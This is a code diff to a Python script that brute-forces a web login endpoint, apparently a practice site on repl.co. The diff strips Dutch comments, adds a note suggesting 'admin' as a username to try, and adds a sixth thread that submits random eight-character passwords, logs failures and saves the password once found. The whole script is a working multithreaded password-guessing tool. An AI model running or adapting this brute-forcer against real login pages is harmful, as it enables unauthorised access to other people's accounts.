@@ -6,9 +6,9 @@ import itertools
 import string
 
 url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"
-username = 'username'
+username = 'username' 
+# admin is ook een username die je kan uittesten
 
-# Voeg deze lijn toe buiten alle functies om een Lock object te maken
 tries_lock = Lock()
 
 def send_request(username, password):
@@ -102,8 +102,7 @@ def main3():
             passwd = ''.join(item)
 
             if "correct_pass.txt" in os.listdir():
-                break  # Stop de huidige iteratie als correct_pass.txt is gevonden
-
+                break 
             valid = False
             while not valid:
                 with tries_lock:
@@ -112,7 +111,7 @@ def main3():
                     file.close()
 
                 if passwd in tries:
-                    break  # Stop de huidige iteratie als het wachtwoord al is geprobeerd
+                    break
                 else:
                     valid = True
 
@@ -127,8 +126,7 @@ def main3():
                         print(f"Correct Password {passwd}\n")
                         with open("correct_pass.txt", "w") as f:
                             f.write(passwd)
-                        return  # Stop de functie als het juiste wachtwoord is gevonden
-
+                        return 
 
 def main4():
     while True:
@@ -142,7 +140,7 @@ def main4():
                 passwd = ''.join(item)
 
                 if "correct_pass.txt" in os.listdir():
-                    return  # Stop de functie als correct_pass.txt is gevonden
+                    return
 
                 valid = False
                 while not valid:
@@ -151,7 +149,7 @@ def main4():
                             tries = file.read()
 
                     if passwd in tries:
-                        break  # Stop de huidige iteratie als het wachtwoord al is geprobeerd
+                        break
                     else:
                         valid = True
 
@@ -166,8 +164,7 @@ def main4():
                             print(f"Correct Password {passwd}\n")
                             with open("correct_pass.txt", "w") as f:
                                 f.write(passwd)
-                            return  # Stop de functie als het juiste wachtwoord is gevonden
-
+                            return 
 
 chars = "abcdefghijklmnopqrstuvwxyz0123456789"
 
@@ -202,9 +199,41 @@ def main5():
                     f.write(passwd)
                 break
 
+def main6():
+    while True:
+        if "correct_pass.txt" in os.listdir():
+            break
+        valid = False
+        while not valid:
+            rndpasswd = random.choices(chars, k=8)
+            passwd = "".join(rndpasswd)
+            with tries_lock:
+                file = open("tries.txt", 'r')
+                tries = file.read()
+                file.close()
+            if passwd in tries:
+                pass
+            else:
+                valid = True
+            
+            r = send_request(username, passwd)
+
+            if 'failed to login' in r.text.lower():
+                with tries_lock:
+                    with open("tries.txt", "a") as f:
+                        f.write(f"{passwd}\n")
+                        f.close()
+                print(f"Incorrect {passwd}\n")
+            else:
+                print(f"Correct Password {passwd}\n")
+                with open("correct_pass.txt", "w") as f:
+                    f.write(passwd)
+                break
+
 if __name__ == "__main__":
     Thread(target=main1).start()
     Thread(target=main2).start()
     Thread(target=main3).start()
     Thread(target=main4).start()
     Thread(target=main5).start()
+    Thread(target=main6).start()
